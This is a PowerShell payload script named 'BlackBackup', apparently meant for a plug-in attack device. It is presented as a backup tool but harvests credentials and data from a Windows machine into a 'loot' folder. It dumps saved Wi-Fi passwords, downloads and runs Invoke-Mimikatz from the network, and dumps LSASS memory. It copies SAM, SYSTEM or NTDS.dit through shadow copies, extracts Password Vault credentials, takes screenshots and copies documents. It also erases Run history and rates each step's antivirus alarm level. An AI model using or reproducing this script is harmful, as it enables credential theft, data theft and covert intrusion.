#-----------------------------------------------------------
# CREDITS
#-----------------------------------------------------------
# Title:         BlackBackup
# Author:        JWHeuver & JBaselier
# Version:       1.0



#-----------------------------------------------------------
# MAKE SURE POWERSHELL CAN EXECUTE SCRIPTS
#-----------------------------------------------------------
powerShell set-executionpolicy remotesigned



#-----------------------------------------------------------
# SCRIPT GENERAL VARIABLES
#-----------------------------------------------------------

#Define script variables
$ErrorActionPreference = "SilentlyContinue"
$timeformat = Get-Date -Format yyyyMMddHHmmss
$hostname = $env:computername
$filetimestamp = $hostname+'_'+$timeformat



#-----------------------------------------------------------
# CHECK-IN YOUR PAYLOADS
#-----------------------------------------------------------

#Create SystemInfo file with basic computer configuration, keys and installed software:
#TOTAL (all payloads) Runtime +/- 150 sec.
#PARTIAL (no installed software in SYSTEMINFO payload AND only 1 HKCU registry hive backup) Runtime +/- 30 sec
#To activate payload set "Y"
#To deactivate payload set "N"

$SYSTEMINFO 					= "Y" 		#+/- 30sec - Virusscanner Alarm: Low
	$EXCLUDEINSTALLEDSOFTWARE 		=  "Y" 		#If Y then SYSTEMINFO time is reduced to +/- 6sec

$WIFIDUMPKEYS 					= "Y" 		#+/- 5sec - Virusscanner Alarm: Low

$MIMIKATZDUMP 					= "Y" 		#+/- 5sec - Virusscanner Alarm: Medium

$LSASSDUMP 						= "N" 		#+/- 6sec - Virusscanner Alarm: Low

$TAKESCREENSHOT 				= "Y" 		#+/- 1sec - Virusscanner Alarm: Low

$BACKUPREGISTRY 				= "Y" 		#+/- 120sec (Total time for complete backup) - 	Virusscanner Alarm: Low
	$HKCU 							= "Y" 		#Backup hive: HKCU (HKEY_CURRENT_USER) +/- 5sec
	$HKLM 							= "N" 		#Backup hive: HKLM (HKEY_LOCAL_MACHINE +/- 50sec
	$HKCR 							= "N" 		#Backup hive: HKCR (HKEY_CLASSES_ROOT) +/- 50sec
	$HKU 							= "N" 		#Backup hive: HKU (HKEY_USERS) +/- 5sec
	$HKCC 							= "N" 		#Backup hive: HKCC (HKEY_CURRENT_CONFIG) +/- 1sec

$BACKUPSAMSYSTEM				= "N" #Y=yes N=no <> +/- 4sec - Virusscanner Alarm: High

$PASSWORDVAULTDUMP				= "Y" #Y=yes N=no <> +/- 4sec - Virusscanner Alarm: Low

$CLEARTRACKS 					= "Y" #Y=yes N=no <> +/- 1sec - Virusscanner Alarm: Low

$FILECOPY 						= "Y" 		#Y=yes N=no <> +/- 1sec - Virusscanner Alarm: Low
	$CURRENTUSERDESKTOP 			= "N" 		#Check Desktop of current user for backup
	$CURRENTUSERDOCUMENTS			= "Y" 		#Check MyDocuments folder of current user for backup
	$CURRENTUSERDOWNLOADS			= "N" 		#Check Downloads folder of current user for backup
	$CURRENTUSERIMAGES				= "N" 		#Check Image folder of current user for backup
	$CURRENTUSERFAVORITES			= "N" 		#Check IE Favorites folder of current user for backup
	$ALLFILESALLUSERS				= "N" 		#Check global "User" forder for backup
	$TEMP							= "N" 		#Check TEMP folders for backup
	$EXTENSION						= ".pdf" 	#To copy a specific extension please add the extension in this variable. To copy all files just leave this variable empty (only quotes).



#-----------------------------------------------------------
# CREATE BASIC LOOT DIR
#-----------------------------------------------------------
cd $PSScriptRoot
$LootDir = New-Item -ItemType directory -Force -Path "..\..\loot\BlackBackup\$filetimestamp"



if ($SYSTEMINFO -eq "Y") {
#-----------------------------------------------------------
# CREATE BASIC SYSTEM INFORMATION
#-----------------------------------------------------------

"BIOS Informatie:" >> "$LootDir\computer_info.txt" 
Get-WmiObject -Class Win32_BIOS -ComputerName . >> "$LootDir\computer_info.txt"

"Basic Computer Info:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_ComputerSystem >> "$LootDir\computer_info.txt"

"Detailed Computer Info:" >> "$LootDir\computer_info.txt"
Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, Version, OSArchitecture, OSLanguage, OSType, OSProductSuite, ServicePackMajorVersion, ServicePackMinorVersion, SuiteMask, Buildnumber, CSName, RegisteredUser, SerialNumber, InstallDate, BootDevice, SystemDevice, SystemDirectory, SystemDrive, WindowsDirectory, LastBootUpTime, LocalDateTime, CountryCode, FreePhysicalMemory, FreeVirtualMemory, CurrentTimeZone, NumberOfProcesses, NumberOfUsers, DataExecutionPrevention_Available, DataExecutionPrevention_32BitApplications >> "$LootDir\computer_info.txt"

"Windows Serial Key:" >> "$LootDir\computer_info.txt"
wmic path softwarelicensingservice get OA3xOriginalProductKey  >> "$LootDir\computer_info.txt"

"Office Version + Serial Key:" >> "$LootDir\computer_info.txt"
Try { 
    Switch ((Get-WmiObject Win32_Processor).AddressWidth) { 
          32 {$Path = "hklm:\software\microsoft\office" }
          64 {$Path = "hklm:\software\Wow6432Node\microsoft\office"}
        }
    Get-ChildItem $Path -recurse -ea SilentlyContinue | Where-Object {(Get-ItemProperty -Path $_.PsPath -ea SilentlyContinue) -match "digitalproductid" -eq $True } |  ForEach-Object {$MSRegKey = $_.PsPath}
    $KeyRegValue = (Get-ItemProperty $MSRegKey).digitalproductid[52..66]
    $ProductName = (Get-ItemProperty $MSRegKey).productname
    $ProductId = (Get-ItemProperty $MSRegKey).productid

    # decrypt base24 encoded binary data
    $ProductKey = ""
    $chars = "BCDFGHJKMPQRTVWXY2346789"
    for ($i = 24; $i -ge 0; $i--) {
        $k = 0
        for ($j = 14; $j -ge 0; $j--) {
            $k = ($k * 256) -bxor $KeyRegValue[$j]
            $KeyRegValue[$j] = [math]::Truncate($k / 24)
            $k = $k % 24
        }
        $ProductKey = $chars[$k] + $ProductKey
        if (($i % 5) -eq 0 -and $i -ne 0) {
            $ProductKey = "-" + $ProductKey
        }
    }
    Write-Host  $ProductName
    Write-Host "Product ID is" $ProductId
    Write-Host "Product Key(license key) is"  $ProductKey
    Write-Host  "Script Check passed"
}
Catch {
    Write-Host  "Script Check Failed"
}

$ProductId  >> "$LootDir\computer_info.txt"
$ProductKey  >> "$LootDir\computer_info.txt"

"Disk Space Info:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" -ComputerName . >> "$LootDir\computer_info.txt"

"Installed Hotfixes:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName . >> "$LootDir\computer_info.txt"

"Session Logon Information:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_LogonSession -ComputerName . >> "$LootDir\computer_info.txt"

"Service Information:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_Service -ComputerName . | Format-Table -Property Status,Name,DisplayName -AutoSize -Wrap | FL >> "$LootDir\computer_info.txt"

if ($EXCLUDEINSTALLEDSOFTWARE -eq "N") {
"Installed Software:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_Product | Select-Object -Property Name | Sort-Object Name >> "$LootDir\computer_info.txt"
}

}


if ($WIFIDUMPKEYS -eq "Y") {
#-----------------------------------------------------------
# WIFI KEYS
#-----------------------------------------------------------

#Show WLAN Profiles and export them to wlan_profiles.txt
$list = netsh wlan show profiles
$list | Out-File $LootDir\wlan_profiles.txt

#Wait 2 seconds
Start-Sleep -m 2000

#Clean up wlan_profiles.txt and output cleaned file to wlan_networks.txt
Get-Content $LootDir\wlan_profiles.txt | Where-Object {$_ -match 'All User Profile'} | Set-Content $LootDir\wlan_networks2.txt
(Get-Content $LootDir\wlan_networks2.txt).replace('    All User Profile     : ', '') | Set-Content $LootDir\wlan_networks.txt


#Add wlan_networks.txt to variable $WLANS
$WLANS = Get-Content $LootDir\wlan_networks.txt

#Get all the details and add them to wlankeys_$filetimestamp.txt
ForEach ($entry in $WLANS) {
netsh wlan show profile name="$entry" key=clear | Out-File -Append $LootDir\wlankeys.txt
}

#Delete Temp Files
del $LootDir\wlan_profiles.txt
del $LootDir\wlan_networks.txt
del $LootDir\wlan_networks2.txt
}



if ($MIMIKATZDUMP -eq "Y") {
#-----------------------------------------------------------
# MIMIKATZ LOGON PASSWORDS
#-----------------------------------------------------------

#Execute Mimikatz Browser Credentials
IEX (New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz >> $LootDir\credentials.txt
}



if ($LSASSDUMP -eq "Y") {
#-----------------------------------------------------------
# WINDOWS PASSWORDS MEMORY LSASS DUMP 
# All credits for this awesome script go to the creator of "Out-Minidump" - Matthew Graeber
#-----------------------------------------------------------

function Memorydump
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(Position = 1)]
        [ValidateScript({ Test-Path $_ })]
        [String]
        $DumpFilePath = $PSScriptRoot
    )

    BEGIN
    {
        $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
        $WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
        $Flags = [Reflection.BindingFlags] 'NonPublic, Static'
        $MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
        $MiniDumpWithFullMemory = [UInt32] 2
    }

    PROCESS
    {
        $ProcessId = $Process.Id
        $ProcessName = $Process.Name
        $ProcessHandle = $Process.Handle
        $ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"

        $ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName

        $FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)

        $Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
                                                     $ProcessId,
                                                     $FileStream.SafeFileHandle,
                                                     $MiniDumpWithFullMemory,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero,
                                                     [IntPtr]::Zero))

        $FileStream.Close()

        if (-not $Result)
        {
            $Exception = New-Object ComponentModel.Win32Exception
            $ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"

            # Remove any partially written dump files. For example, a partial dump will be written
            # in the case when 32-bit PowerShell tries to dump a 64-bit process.
            Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue

            throw $ExceptionMessage
        }
        else
        {
            Get-ChildItem $ProcessDumpPath
        }
    }

    END {}
}

Get-Process lsass | Memorydump

#Wait 5 seconds
Start-Sleep -m 5000

Move-Item $PSScriptRoot\lsass*.dmp $LootDir\lsass.dmp
}




if ($TAKESCREENSHOT -eq "Y") {
#-----------------------------------------------------------
# TAKE SCREENSHOT
#-----------------------------------------------------------

param(            
  [string]$Width,            
  [string]$Height,            
  [String]$FileName = "Screenshot"            

)            

#Function to take screenshot. This function takes the width and height of the screen that has            
#to be captured            

function Take-Screenshot{            
[cmdletbinding()]            
param(            
 [Drawing.Rectangle]$bounds,             
 [string]$path            
)             
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height            
   $graphics = [Drawing.Graphics]::FromImage($bmp)            
   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)            
   $bmp.Save($path)            
   $graphics.Dispose()            
   $bmp.Dispose()            
}                      

function Get-ScreenResolution {            
 $Screens = [system.windows.forms.screen]::AllScreens                        
 foreach ($Screen in $Screens) {            
  $DeviceName = $Screen.DeviceName            
  $Width  = $Screen.Bounds.Width            
  $Height  = $Screen.Bounds.Height            
  $IsPrimary = $Screen.Primary                        
  $OutputObj = New-Object -TypeName PSobject            
  $OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName            
  $OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width            
  $OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height            
  $OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary            
  $OutputObj                        
 }            
}            

[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")            
[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")            

if(!($width -and $height)) {            

 $screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}            
 $Width = $screen.Width            
 $Height = $screen.height            
}            

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height)            

Take-Screenshot -Bounds $bounds -Path "$LootDir\screenshot.png" 
}



if ($BACKUPREGISTRY -eq "Y") {
#-----------------------------------------------------------
# BACKUP REGISTRY
#-----------------------------------------------------------

if ($HKCU -eq "Y") {
reg export HKCU $LootDir\HKCU-registry.reg
}

if ($HKLM -eq "Y") {
reg export HKLM $LootDir\HKLM-registry.reg
}

if ($HKCR -eq "Y") {
reg export HKCR $LootDir\HKCR-registry.reg
}

if ($HKU -eq "Y") {
reg export HKU $LootDir\HKU-registry.reg
}

if ($HKCC -eq "Y") {
reg export HKCC $LootDir\HKCC-registry.reg
}

}


if ($BACKUPSAMSYSTEM -eq "Y") {
#-----------------------------------------------------------
# BACKUP SYSTEM and SAM or NTDS.dit
#-----------------------------------------------------------

function Get-PasswordFile {  
    [CmdletBinding()] 
    Param 
    ( 
        [Parameter(Mandatory = $true, Position = 0)] 
        [ValidateScript({Test-Path $_ -PathType 'Container'})]  
        [ValidateNotNullOrEmpty()] 
        [String]  
        $DestinationPath
    ) 
 
        function Copy-RawItem 
        { 
 
        [CmdletBinding()] 
        [OutputType([System.IO.FileSystemInfo])] 
        Param ( 
            [Parameter(Mandatory = $True, Position = 0)] 
            [ValidateNotNullOrEmpty()] 
            [String] 
            $Path, 
 
            [Parameter(Mandatory = $True, Position = 1)] 
            [ValidateNotNullOrEmpty()] 
            [String] 
            $Destination, 
 
            [Switch] 
            $FailIfExists 
        ) 
 
        # Get a reference to the internal method - Microsoft.Win32.Win32Native.CopyFile() 
        $mscorlib = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ($_.Location.Split('\')[-1] -eq 'mscorlib.dll')} 
        $Win32Native = $mscorlib.GetType('Microsoft.Win32.Win32Native') 
        $CopyFileMethod = $Win32Native.GetMethod('CopyFile', ([Reflection.BindingFlags] 'NonPublic, Static'))  
 
        # Perform the copy 
        $CopyResult = $CopyFileMethod.Invoke($null, @($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists']))) 
 
        $HResult = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
 
        if ($CopyResult -eq $False -and $HResult -ne 0) 
        { 
            # An error occured. Display the Win32 error set by CopyFile 
            throw ( New-Object ComponentModel.Win32Exception ) 
        } 
        else 
        { 
            Write-Output (Get-ChildItem $Destination) 
        } 
    } 
  
    #Check for admin rights
    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {
        Write-Error "Not running as admin. Run the script with elevated credentials"
        Return
    }
        
    #Get "vss" service startup type 
    $VssStartMode = (Get-WmiObject -Query "Select StartMode From Win32_Service Where Name='vss'").StartMode 
    if ($VssStartMode -eq "Disabled") {Set-Service vss -StartUpType Manual} 
 
    #Get "vss" Service status and start it if not running 
    $VssStatus = (Get-Service vss).status  
    if ($VssStatus -ne "Running") {Start-Service vss} 
 
        #Check to see if we are on a DC 
        $DomainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole 
        $IsDC = $False 
        if ($DomainRole -gt 3) { 
            $IsDC = $True 
            $NTDSLocation = (Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\services\NTDS\Parameters)."DSA Database File" 
            $FileDrive = ($NTDSLocation).Substring(0,3) 
        } else {$FileDrive = $Env:HOMEDRIVE + '\'} 
     
        #Create a volume shadow filedrive 
        $WmiClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy" 
        $ShadowCopy = $WmiClass.create($FileDrive, "ClientAccessible") 
        $ReturnValue = $ShadowCopy.ReturnValue 
 
        if ($ReturnValue -ne 0) { 
            Write-Error "Shadow copy failed with a value of $ReturnValue" 
            Return 
        }  
     
        #Get the DeviceObject Address 
        $ShadowID = $ShadowCopy.ShadowID 
        $ShadowVolume = (Get-WmiObject Win32_ShadowCopy | Where-Object {$_.ID -eq $ShadowID}).DeviceObject 
     
            #If not a DC, copy System and SAM to specified directory 
            if ($IsDC -ne $true) { 
 
                $SamPath = Join-Path $ShadowVolume "\Windows\System32\Config\sam"  
                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system" 
 
                #Utilizes Copy-RawItem from Matt Graeber 
                Copy-RawItem $SamPath "$DestinationPath\sam" 
                Copy-RawItem $SystemPath "$DestinationPath\system" 
            } else { 
             
                #Else copy the NTDS.dit and system files to the specified directory             
                $NTDSPath = Join-Path $ShadowVolume "\Windows\NTDS\NTDS.dit"  
                $SystemPath = Join-Path $ShadowVolume "\Windows\System32\Config\system" 
 
                Copy-RawItem $NTDSPath "$DestinationPath\ntds" 
                Copy-RawItem $SystemPath "$DestinationPath\system" 
            }     
     
        #Return "vss" service to previous state 
        If ($VssStatus -eq "Stopped") {Stop-Service vss} 
        If ($VssStartMode -eq "Disabled") {Set-Service vss -StartupType Disabled} 
}

Get-PasswordFile "$LootDir" 

}


if ($PASSWORDVAULTDUMP -eq "Y") {
#-----------------------------------------------------------
# EXPORT DATA IN WINDOWS PASSWORD VAULT
#-----------------------------------------------------------

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize >> "$LootDir\windowsvaultcredentials.txt" 
}



if ($FILECOPY -eq "Y") {
#-----------------------------------------------------------
# BACKUP USER FILES
#-----------------------------------------------------------

#Create files directory
New-Item -ItemType directory -Force -Path $LootDir\FileBackup
$FileBackup = "$LootDir\FileBackup"

if ($CURRENTUSERDESKTOP -eq "Y") {
	Copy-Item -path "$env:USERPROFILE\Desktop\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

if ($CURRENTUSERDOCUMENTS -eq "Y") {
	Copy-Item -path "$env:USERPROFILE\Documents\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

if ($CURRENTUSERDOWNLOADS -eq "Y") {
	Copy-Item -path "$env:USERPROFILE\Documents\Downloads\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

if ($CURRENTUSERIMAGES -eq "Y") {
	Copy-Item -path "$env:USERPROFILE\Pictures\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

if ($CURRENTUSERFAVORITES -eq "Y") {
	Copy-Item -path "$env:USERPROFILE\Favorites\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

if ($ALLFILESALLUSERS -eq "Y") {
	Copy-Item -path "C:\Users\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

if ($TEMP -eq "Y") {
	Copy-Item -path "C:\Temp\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
	Copy-Item -path "C:\Windows\Temp\" -Filter "*$EXTENSION" -Recurse -Destination "$FileBackup" -Force
}

}
	
	
	
if ($CLEARTRACKS -eq "Y") {
#-----------------------------------------------------------
# CLEAR TRACKS
#-----------------------------------------------------------

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
}



